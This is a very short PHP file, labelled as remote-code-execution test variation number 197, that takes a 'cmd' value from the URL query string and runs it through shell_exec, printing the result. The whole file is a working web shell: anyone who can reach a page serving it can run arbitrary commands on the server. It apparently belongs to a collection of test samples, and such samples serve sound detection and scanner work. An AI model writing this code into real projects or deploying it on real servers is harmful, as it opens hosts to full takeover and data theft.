<?php
// RCE test variation #197
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>